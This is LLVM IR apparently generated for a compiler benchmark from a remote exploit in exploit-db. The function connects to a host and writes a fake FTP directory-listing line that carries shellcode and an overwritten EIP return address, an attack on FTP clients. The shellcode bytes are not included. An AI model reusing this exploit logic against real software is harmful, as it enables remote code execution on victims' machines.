; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_ftpd_list.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_ftpd_list.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"couldn't resolve ftp_list hostname/ip.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"ftpd_list connection failed.\00", align 1
@.str.2 = private unnamed_addr constant [74 x i8] c"[?] +FTPD: \22-rwxrwxrwx 1 <shellcode(%u)> root 1 Dec 31 23:59 <eip(%u)>\22.\0A\00", align 1
@CODESIZE = common dso_local global i32 0, align 4
@EIPSIZE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [40 x i8] c"-rwxrwxrwx 1 %s root 1 Dec 31 23:59 %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ftpd_list(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  %8 = load i32, i32* @AF_INET, align 4
  %9 = load i32, i32* @SOCK_STREAM, align 4
  %10 = load i32, i32* @IPPROTO_TCP, align 4
  %11 = call i32 @socket(i32 %8, i32 %9, i32 %10)
  store i32 %11, i32* %5, align 4
  %12 = load i32, i32* @AF_INET, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %12, i32* %13, align 4
  %14 = load i16, i16* %4, align 2
  %15 = call i32 @htons(i16 zeroext %14)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %15, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = call i32 @inet_addr(i8* %17)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %20 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i32 0, i32 0
  store i32 %18, i32* %20, align 4
  %21 = icmp ne i32 %18, 0
  br i1 %21, label %22, label %36

22:                                               ; preds = %2
  %23 = load i8*, i8** %3, align 8
  %24 = call %struct.hostent* @gethostbyname(i8* %23)
  store %struct.hostent* %24, %struct.hostent** %6, align 8
  %25 = icmp ne %struct.hostent* %24, null
  br i1 %25, label %28, label %26

26:                                               ; preds = %22
  %27 = call i32 @printe(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %28

28:                                               ; preds = %26, %22
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %30 = bitcast %struct.TYPE_2__* %29 to i8*
  %31 = load %struct.hostent*, %struct.hostent** %6, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 0
  %33 = load i64, i64* %32, align 8
  %34 = inttoptr i64 %33 to i8*
  %35 = call i32 @memcpy(i8* %30, i8* %34, i32 4)
  br label %36

36:                                               ; preds = %28, %2
  %37 = load i32, i32* @SIGALRM, align 4
  %38 = load i32, i32* @sig_alarm, align 4
  %39 = call i32 @signal(i32 %37, i32 %38)
  %40 = load i32, i32* @TIMEOUT, align 4
  %41 = call i32 @alarm(i32 %40)
  %42 = load i32, i32* %5, align 4
  %43 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %44 = call i64 @connect(i32 %42, %struct.sockaddr* %43, i32 12)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %36
  %47 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %48

48:                                               ; preds = %46, %36
  %49 = call i32 @alarm(i32 0)
  %50 = load i32, i32* @CODESIZE, align 4
  %51 = load i32, i32* @EIPSIZE, align 4
  %52 = call i32 @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i64 0, i64 0), i32 %50, i32 %51)
  %53 = load i32, i32* %5, align 4
  %54 = call i32 (...) @getcode()
  %55 = call i32 (...) @geteip()
  %56 = call i32 @dprintf(i32 %53, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0), i32 %54, i32 %55)
  %57 = call i32 @sleep(i32 1)
  %58 = load i32, i32* %5, align 4
  %59 = call i32 @close(i32 %58)
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, i32, i32) #1

declare dso_local i32 @dprintf(i32, i8*, i32, i32) #1

declare dso_local i32 @getcode(...) #1

declare dso_local i32 @geteip(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
